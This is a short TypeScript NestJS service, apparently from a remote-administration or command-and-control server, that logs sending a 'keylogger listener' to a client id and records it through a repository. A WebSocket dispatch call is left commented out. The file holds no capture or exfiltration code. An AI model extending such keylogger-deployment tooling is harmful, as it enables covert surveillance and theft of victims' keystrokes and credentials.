import { KeyLoggerRepository } from "@/src/modules/client/domain/keylogger.repository";
import { Injectable } from "@nestjs/common";
import { WsClientRepository } from "../../domain/ws-client.repository";
import { LoggerService } from "@/src/modules/shared/providers";
import { WsClientGateway } from "../../infrastructure/ws-client.gateway";

@Injectable()
export class WsClientKeyLogger {
  constructor(
    private readonly keyLoggerRepository: KeyLoggerRepository,
    private readonly wsClientRepository: WsClientRepository,
    private readonly logger: LoggerService,
    private readonly wsClientGateway: WsClientGateway,
  ) {}

  async execute(clientid: string) {
    this.logger.info(`Sending keylogger listener to client: ${clientid}`);

    this.keyLoggerRepository.createKeyLogger(clientid);

    // await this.wsClientGateway.sendEventToClient(clientid, "", {});
  }
}
